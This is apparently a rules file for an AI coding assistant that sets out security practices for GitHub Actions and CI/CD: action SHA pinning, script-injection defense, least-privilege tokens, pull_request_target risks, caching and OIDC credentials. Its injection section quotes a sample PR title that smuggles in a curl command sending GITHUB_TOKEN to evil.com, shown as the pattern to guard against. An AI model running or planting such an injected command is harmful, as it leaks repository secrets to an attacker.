---
description: CI/CD automation & GitHub Actions production invariants, supply-chain security, SHA action pinning, script injection defense, and cache optimization
globs: .github/workflows/**/*.{yml,yaml},.gitlab-ci.yml,bitbucket-pipelines.yml
alwaysApply: false
---

# CI/CD Automation & GitHub Actions Security Invariants

> Add these rules to your project when authoring or modifying CI/CD workflows (GitHub Actions, GitLab CI). Prevent catastrophic supply chain attacks, repo secret leaks, script injection, and runaway runner costs.

## 1. Supply Chain Hardening & Action Pinning
- ❌ **BAN UNPINNED MUTABLE TAGS IN THIRD-PARTY ACTIONS**:
  - Never reference third-party actions by mutable branch or tag names (e.g. `uses: thirdparty/action@v1` or `@main`). If a maintainer account or repository is compromised, malicious code executes immediately on your runners with access to repository secrets.
- **Enforce Immutable 40-Character SHA Pinning**:
  - Pin all non-internal third-party actions to an immutable full git commit SHA. Append the semver version in a trailing comment for human readability:
    ```yaml
    # ❌ Vulnerable to tag hijacking:
    uses: actions/checkout@v4

    # ✅ Immutable SHA-pinned action:
    uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
    ```
- **Automate Dependency Updates**:
  - Use Dependabot or Renovate with `action-pinning` enabled to keep pinned action SHAs up to date automatically via PRs.

## 2. Script Injection Immunity (Context Expression Hygiene)
- ❌ **ABSOLUTE BAN ON INLINE GITHUB CONTEXT EXPRESSIONS IN `run:` SCRIPTS**:
  - Embedding GitHub context variables (issue titles, PR bodies, branch names, commit messages) directly into inline shell scripts allows arbitrary command execution:
    ```yaml
    # ❌ CATASTROPHIC REMOTE CODE INJECTION:
    # If PR title is `test"; curl evil.com/exfil?t=$GITHUB_TOKEN; #`, attacker runs arbitrary commands:
    run: |
      echo "Processing PR: ${{ github.event.pull_request.title }}"
    ```
- **Mandatory Intermediate Environment Variable Mapping**:
  - Always map untrusted GitHub context expressions into explicit environment variables first. The shell will safely treat them as literal strings:
    ```yaml
    # ✅ Injection-proof:
    env:
      PR_TITLE: ${{ github.event.pull_request.title }}
    run: |
      printf 'Processing PR: %s\n' "$PR_TITLE"
    ```

## 3. Principle of Least Privilege (`permissions`)
- ❌ **NEVER RELY ON DEFAULT REPOSITORY PERMISSIONS**:
  - By default, GitHub Actions tokens (`GITHUB_TOKEN`) often inherit broad read/write permissions.
- **Top-Level Restrictive Default**:
  - Explicitly define restrictive top-level permissions at the root of every workflow file:
    ```yaml
    permissions:
      contents: read
    ```
- **Granular Per-Job Scope Elevation**:
  - Elevate permissions strictly on the specific jobs that require them (e.g., publishing packages or minting OIDC tokens):
    ```yaml
    jobs:
      publish:
        runs-on: ubuntu-latest
        permissions:
          contents: read
          id-token: write    # For AWS/GCP OIDC authentication
          packages: write    # For publishing container images
    ```

## 4. The `pull_request_target` Security Trap
- ❌ **NEVER CHECK OUT UNTRUSTED CODE IN `pull_request_target`**:
  - `pull_request_target` triggers run in the context of the base repository and have access to repository secrets and write permissions.
  - Checking out the untrusted fork's pull request branch (`ref: ${{ github.event.pull_request.head.sha }}`) inside `pull_request_target` allows any external contributor to open a PR with modified build scripts (e.g. `npm test`) and exfiltrate production secrets!
- **Safe Alternatives**:
  - For standard PR validation (linting, tests, builds), ALWAYS use `on: pull_request` (which runs without access to repository secrets).
  - If a workflow strictly requires repository secrets (e.g. preview deployment), split the workflow:
    1. Run build and tests in an unprivileged `pull_request` workflow and upload artifacts.
    2. Download artifacts and deploy using a separate privileged workflow triggered via `workflow_run` after mandatory human review.

## 5. Caching & Concurrency Optimization
- **Cancel Redundant In-Flight Builds**:
  - When new commits are pushed to a branch or PR, automatically cancel obsolete running jobs to eliminate queue bottlenecks and cut runner billable minutes:
    ```yaml
    concurrency:
      group: ${{ github.workflow }}-${{ github.ref }}
      cancel-in-progress: true
    ```
- **Deterministic Package Installation (Frozen Lockfiles)**:
  - Never allow CI to update lockfiles dynamically during builds.
    - Node: `npm ci` or `pnpm install --frozen-lockfile` (never `npm install`)
    - Python: `uv sync --frozen` or `poetry install --no-root`
    - Go: `go mod verify` and `go build -mod=readonly`
    - Rust: `cargo build --locked`
- **Cache Invalidation Discipline**:
  - Key dependency caches strictly against the hash of lockfiles:
    ```yaml
    - uses: actions/cache@0c45773b623bea8c8e75f6c82b208c3cf94ea4f9 # v4.0.2
      with:
        path: ~/.pnpm-store
        key: ${{ runner.os }}-pnpm-${{ hashFiles('**/pnpm-lock.yaml') }}
        restore-keys: |
          ${{ runner.os }}-pnpm-
    ```

## 6. Secret Isolation & Cloud OIDC Authentication
- ❌ **BAN LONG-LIVED STATIC CLOUD CREDENTIALS**:
  - Never store static AWS access key IDs / secret keys or Google Cloud service account JSON keys in GitHub Secrets. Compromised static keys grant persistent unauthorized cloud access.
- **Enforce OpenID Connect (OIDC) Federation**:
  - Exchange short-lived, cryptographically signed GitHub OIDC tokens for temporary cloud credentials:
    ```yaml
    - name: Configure AWS Credentials via OIDC
      uses: aws-actions/configure-aws-credentials@e3ddf14a3dc1a8927e4e3535eac57385e6dd647f # v4.0.2
      with:
        role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
        aws-region: us-east-1
    ```
- **Mask Dynamic Secrets**:
  - If dynamically generating or fetching secrets during workflow execution, immediately register them with GitHub Actions masking to prevent accidental log leaks:
    ```yaml
    run: |
      DYNAMIC_TOKEN=$(generate-token)
      echo "::add-mask::$DYNAMIC_TOKEN"
      echo "TOKEN=$DYNAMIC_TOKEN" >> "$GITHUB_ENV"
    ```
